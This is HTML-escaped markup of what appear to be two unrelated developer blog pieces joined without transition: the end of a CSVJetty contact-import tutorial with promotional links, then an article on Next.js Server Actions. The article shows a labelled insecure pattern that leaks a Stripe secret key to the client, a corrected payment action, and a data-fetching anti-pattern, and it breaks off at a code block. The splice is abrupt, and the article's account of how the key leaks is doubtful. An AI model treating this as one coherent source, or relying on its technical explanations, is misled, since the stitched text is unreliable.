&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;section&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Import contacts&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;CSVJetty&lt;/span&gt;
&lt;span class="na"&gt;importerKey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"YOUR_IMPORTER_KEY"&lt;/span&gt;
&lt;span class="na"&gt;columns&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;columns&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="na"&gt;onData&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;handleImport&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
Import CSV
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nc"&gt;CSVJetty&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;importedCount&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="na"&gt;role&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"status"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Saved &lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;importedCount&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; contacts.&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;section&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;/api/contacts/import&lt;/code&gt; is an endpoint you implement in your own app. This example assumes a successful response means all submitted rows were saved.&lt;/p&gt;

&lt;p&gt;The endpoint should authenticate the user, check their permission to import contacts, validate the records again, and save them. Use &lt;code&gt;importId&lt;/code&gt; and the original row numbers to prevent duplicate inserts when a request is retried.&lt;/p&gt;

&lt;p&gt;Browser validation helps users correct their files. Server validation protects your database.&lt;/p&gt;

&lt;h2&gt;


Where to go next
&lt;/h2&gt;

&lt;p&gt;The same pattern works for product catalogs, inventory, leads, and other structured records: define the fields, let users map and correct their data, then send the results to your existing persistence code.&lt;/p&gt;

&lt;p&gt;You can find the package and setup instructions here:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.csvjetty.com/?utm_source=dev.to&amp;amp;utm_medium=referral&amp;amp;utm_campaign=react_csv_import_tutorial&amp;amp;utm_content=footer"&gt;CSVJetty website&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.npmjs.com/package/csvjetty" rel="noopener noreferrer"&gt;CSVJetty on npm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;


The Problem: Your API Keys Are Probably Leaking
&lt;/h2&gt;

&lt;p&gt;Last month, I traced a production incident back to a Next.js Server Action that accidentally bundled our Stripe secret key into the client JavaScript. The root cause? A seemingly innocent &lt;code&gt;use client&lt;/code&gt; directive in the wrong file.&lt;/p&gt;

&lt;p&gt;Next.js 15 Server Actions are powerful, but the boundary between server and client code is subtle. One misplaced export and your secrets ride straight into the browser bundle.&lt;/p&gt;

&lt;p&gt;Here's what a vulnerable pattern looks like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// ❌ DANGEROUS: Defined in a Client Component file&lt;/span&gt;
&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;use client&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;

&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;stripe&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;@/lib/stripe&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="c1"&gt;// Secret key imported!&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;processPayment&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;amount&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;use server&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;stripe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;charges&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;create&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;amount&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;currency&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;usd&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Even though the function has &lt;code&gt;'use server'&lt;/code&gt;, it's &lt;strong&gt;defined in a client module&lt;/strong&gt;. Next.js will serialize this function reference, but the import graph taints the entire file. Your secret key ends up in the client bundle.&lt;/p&gt;

&lt;h2&gt;


Deliverable 1: Secure Server Action with Zod + Session Guard
&lt;/h2&gt;

&lt;p&gt;Here's the correct architecture:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// app/actions/payment.ts (NO 'use client' anywhere)&lt;/span&gt;
&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;use server&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;

&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;zod&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;auth&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;@/lib/auth&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;stripe&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;@/lib/stripe&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;PaymentSchema&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;object&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
&lt;span class="na"&gt;amount&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;number&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nf"&gt;positive&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nf"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;999999&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="na"&gt;currency&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;enum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;usd&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;eur&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt;
&lt;span class="na"&gt;idempotencyKey&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;string&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nf"&gt;uuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;processPayment&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;rawInput&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;unknown&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="c1"&gt;// 1. Session verification FIRST&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;auth&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;if &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;session&lt;/span&gt;&lt;span class="p"&gt;?.&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Unauthorized&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// 2. Input validation with Zod&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;parsed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;PaymentSchema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;safeParse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;rawInput&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;if &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;parsed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;success&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Invalid input&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;details&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;parsed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;flatten&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// 3. Safe execution&lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;charge&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;stripe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;charges&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;create&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
&lt;span class="na"&gt;amount&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;parsed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;amount&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;currency&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;parsed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;currency&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;customer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;session&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stripeId&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;idempotencyKey&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;parsed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;idempotencyKey&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;success&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;chargeId&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;charge&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Payment failed:&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Payment processing failed&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Why this works:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;No client directive&lt;/strong&gt;: The entire file stays server-only.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Zod validation&lt;/strong&gt;: Catches malformed inputs before they hit Stripe.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Session guard&lt;/strong&gt;: Prevents anonymous abuse.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Idempotency&lt;/strong&gt;: Protects against duplicate charges on network retries.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Typed errors&lt;/strong&gt;: The client gets structured error objects, not raw exceptions.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Client usage:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// app/components/CheckoutButton.tsx&lt;/span&gt;
&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;use client&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;

&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;processPayment&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;@/app/actions/payment&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useTransition&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;CheckoutButton&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;amount&lt;/span&gt; &lt;span class="p"&gt;}:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nl"&gt;amount&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;isPending&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;startTransition&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;useTransition&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;handleClick&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nf"&gt;startTransition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;async &lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;processPayment&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
&lt;span class="nx"&gt;amount&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;currency&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;usd&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;idempotencyKey&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;crypto&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;randomUUID&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="k"&gt;if &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nf"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;button&lt;/span&gt; &lt;span class="nx"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;handleClick&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;disabled&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;isPending&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;isPending&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Processing...&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Pay Now&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/button&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;


Deliverable 2: React Server Component with Granular Suspense
&lt;/h2&gt;

&lt;p&gt;The second performance trap I see constantly: waterfalling data fetches that tank your Largest Contentful Paint (LCP).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Anti-pattern:&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// ❌ Serial waterfall&lt;/span&gt;
&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;Page&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;fetchUser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;posts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;fetchPosts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// Waits for user&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;comments&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;fetchComments&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;posts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// Waits for posts&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Every &lt;code&gt;await&lt;/code&gt; blocks rendering. Your LCP suffers.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Correct pattern with Suspense streaming:&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// app/dashboard/page.tsx&lt;/span&gt;
